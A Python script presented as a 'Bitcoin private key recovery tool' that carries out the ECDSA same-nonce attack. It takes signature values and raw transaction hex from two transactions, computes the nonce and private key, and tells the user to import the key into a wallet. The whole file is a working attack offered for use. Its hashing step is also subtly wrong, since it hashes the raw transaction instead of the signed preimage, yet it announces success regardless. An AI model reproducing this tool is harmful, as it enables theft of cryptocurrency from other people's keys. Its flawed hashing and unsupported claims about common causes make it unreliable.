import hashlib
import ecdsa
from ecdsa import SECP256k1

def hex_to_int(hex_str):
    """Convert a hex string to an integer, handling '0x' prefix."""
    h = hex_str.strip()
    if h.startswith('0x') or h.startswith('0X'):
        return int(h, 16)
    return int(h, 16)

def sha256_double_hash(tx_hex_str):
    """
    Calculate the double SHA256 hash of a raw transaction hex string.
    This is the 'H' value needed for ECDSA verification.
    """
    # Remove '0x' if present
    clean_hex = tx_hex_str.replace('0x', '').replace('0X', '')
    try:
        tx_bytes = bytes.fromhex(clean_hex)
        h1 = hashlib.sha256(tx_bytes).digest()
        h2 = hashlib.sha256(h1).digest()
        return int.from_bytes(h2, byteorder='big')
    except ValueError as e:
        print(f"Error parsing transaction hex: {e}")
        return None

def recover_private_key_same_nonce(r1, s1, h1, r2, s2, h2):
    """
    Recovers private key if two transactions used the same nonce k.
    
    Formula: k = (H1 - H2) * (S1 - S2)^-1 mod n
    Then: d = (S * k - H) * R^-1 mod n
    """
    curve = SECP256k1
    n = curve.order

    # Check if R values are the same. 
    # Note: R is the x-coordinate of k*G. If R1 == R2, it is highly likely k1 == k2.
    if r1 != r2:
        print("\n[!] Warning: R values are DIFFERENT.")
        print("    This implies the nonces (k) might be different.")
        print("    The Same Nonce Attack usually requires R1 == R2.")
        print("    Proceeding anyway in case of edge cases...")
    
    try:
        # 1. Calculate the Nonce (k)
        # k = (H1 - H2) / (S1 - S2) mod n
        # Which is: (H1 - H2) * (S1 - S2)^-1 mod n
        
        s_diff = (s1 - s2) % n
        
        # If S1 == S2 and H1 != H2, the key is lost (division by zero)
        if s_diff == 0:
            print("[!] Error: S1 and S2 are identical. Cannot calculate k.")
            return None, None

        s_diff_inv = pow(s_diff, -1, n)
        k = ((h1 - h2) % n * s_diff_inv) % n
        
        # 2. Calculate the Private Key (d) using Transaction 1
        # d = (S1 * k - H1) * R1^-1 mod n
        
        r_inv = pow(r1, -1, n)
        private_key = ((s1 * k - h1) * r_inv) % n
        
        return private_key, k
    
    except Exception as e:
        print(f"Error during calculation: {e}")
        return None, None

def main():
    print("="*60)
    print("BITCOIN PRIVATE KEY RECOVERY TOOL")
    print("Method: Same Nonce Attack (Requires 2 Transactions)")
    print("="*60)
    print("\nThis tool works if you have two transactions signed with")
    print("the SAME random number (nonce). This is common in:")
    print("- Bitcoin Cash Fork bugs")
    print("- Weak Random Number Generators (RNG)")
    print("- Hardware wallet resets")
    print("\n")

    # --- Input Transaction 1 ---
    print("--- TRANSACTION 1 ---")
    r1_hex = input("Enter R1 (Hex): ").strip()
    s1_hex = input("Enter S1 (Hex): ").strip()
    tx1_hex = input("Enter Raw Transaction Hex 1 (0x...): ").strip()

    # --- Input Transaction 2 ---
    print("\n--- TRANSACTION 2 ---")
    r2_hex = input("Enter R2 (Hex): ").strip()
    s2_hex = input("Enter S2 (Hex): ").strip()
    tx2_hex = input("Enter Raw Transaction Hex 2 (0x...): ").strip()

    # --- Process Inputs ---
    print("\nProcessing inputs...")

    # Convert Hex to Integers
    try:
        r1 = hex_to_int(r1_hex)
        s1 = hex_to_int(s1_hex)
        r2 = hex_to_int(r2_hex)
        s2 = hex_to_int(s2_hex)
    except ValueError:
        print("Error: Invalid Hex format for R or S values.")
        return

    # Calculate Message Hashes (H1 and H2)
    h1 = sha256_double_hash(tx1_hex)
    h2 = sha256_double_hash(tx2_hex)

    if h1 is None or h2 is None:
        print("Error: Could not calculate message hashes. Check raw TX hex.")
        return

    print(f"H1 calculated: {hex(h1)}")
    print(f"H2 calculated: {hex(h2)}")

    # --- Execute Attack ---
    print("\nAttempting to recover private key...")
    private_key, nonce_k = recover_private_key_same_nonce(r1, s1, h1, r2, s2, h2)

    if private_key is not None:
        print("\n" + "="*40)
        print("SUCCESS! PRIVATE KEY RECOVERED")
        print("="*40)
        print(f"Nonce (k):     {hex(nonce_k)}")
        print(f"Private Key (d): {hex(private_key)}")
        print(f"Private Key (Dec): {private_key}")
        
        # Optional: Verify if the private key generates the correct Public Key
        # This requires the user to input the Public Key, but here is how you'd do it:
        # sk = ecdsa.SigningKey.from_string(private_key.to_bytes(32, byteorder='big'), curve=SECP256k1)
        # vk = sk.get_verifying_key()
        # print(f"Public Key:    {vk.to_string().hex()}")

        print("\nYou can now import this Private Key into a wallet (e.g., Electrum)")
        print("or convert it to a WIF (Wallet Import Format) if needed.")
    else:
        print("\nFAILED TO RECOVER KEY.")
        print("Reasons:")
        print("- The nonces (k) were not the same.")
        print("- The transaction hashes (H) were incorrect.")
        print("- The R or S values were from different key pairs.")

if __name__ == "__main__":
    main()
